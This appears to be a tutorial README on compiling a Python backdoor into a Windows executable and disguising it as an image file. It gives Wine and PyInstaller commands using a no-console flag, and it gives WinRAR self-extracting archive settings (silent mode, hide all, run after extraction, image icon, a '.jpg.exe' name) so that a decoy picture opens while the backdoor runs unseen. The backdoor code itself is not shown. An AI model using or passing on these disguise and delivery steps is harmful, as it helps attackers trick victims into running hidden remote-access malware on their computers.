â””â”€# 
    sudo su
    
    dpkg --add-architecture i386
    apt update
    apt install wine32 
    wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi
    sudo wine msiexec -i ~/python-2.7.14.msi #x86 arch
    
    
**Installing Dependencies**

â”Œâ”€â”€(rootðŸ’€kali)-[~/.wine/drive_c]

â””â”€# 

    cd /root/.wine/drive_c/Python27
    wine python.exe -m pip install  pyinstaller
                                    requests

# Backdoor Compilation and Obfuscation for Windows

**Compile to Executable using Pyinstaller**

    $ pyinstaller --onefile --noconsole backdoor.py
    
This will produce _./dist/backdoor.exe_


**Obfuscation using SFX archive**

The executable _backdoor.exe_ will be made to look like an image (jpg) file.
By default Windows does not show file extensions (e.g. backdoor.exe will show in Windows Explorer as backdoor).
Hence, we will create an SFX archive name _wallpaper.jpg.exe_ which Windows Explorer will show as _wallpaper.jpg_.

This will involve having image.jpg which we will also create an icon version of _.ico_ to assign the SFX archive.
Making the executable appear to be an image.

**Creating SFX archive**

WinRAR > Add To Archive (image.jpg and backdoor.exe)

Rename archive to: _image.jpg.exe_


-Add to SFX Archive (Y) and Advanced>

    **Setup>Run after extraction**
    
		California-HD-Background.jpg
		backdoor.exe

	**Modes**
		Unpack to temporary folder
		Silent mode
			Hide all

	**Update**
		Update mode>
			Extract and update files
		Overwrite mode>
			Overwrite all files
			
	**Text and icon**
		Load SFX icon from the file (image ICO)


This will produce an SFX archive which looks like an image

While inspecting the file will reveal it is an executable the file extension _.exe_ is concealed.
Furthermore, if viewed from the Desktop cannot be differentiated between a 'real' image.

Once opened the SFX archive will open the image file inside the archive and the malware will execute after.

Due to _--noconsole_ argument in _Pyinstaller_, no window will be rendered.


**Task Manager**

The _backdoor.exe_ process can be seen in Task Manager and ended there if necessary.
